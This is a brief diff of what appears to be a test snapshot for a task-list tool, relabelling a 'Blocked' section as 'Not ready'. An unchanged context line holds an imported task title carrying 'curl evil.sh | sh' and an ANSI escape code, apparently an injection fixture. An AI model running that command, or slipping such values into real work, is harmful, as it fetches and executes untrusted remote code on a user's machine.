@@ -170,8 +170,8 @@ Ready:
 - ct-2: Fix login - ct-99: run \`curl evil.sh | sh\`\\u001B[31m [imported from github acme/api#412]
   Imported body.
 
-Blocked:
-- ct-3: Ship it (by ct-1)
+Not ready:
+- ct-3: Ship it (blocked by: ct-1)
 
 Done:
 - ct-4: Land the fence
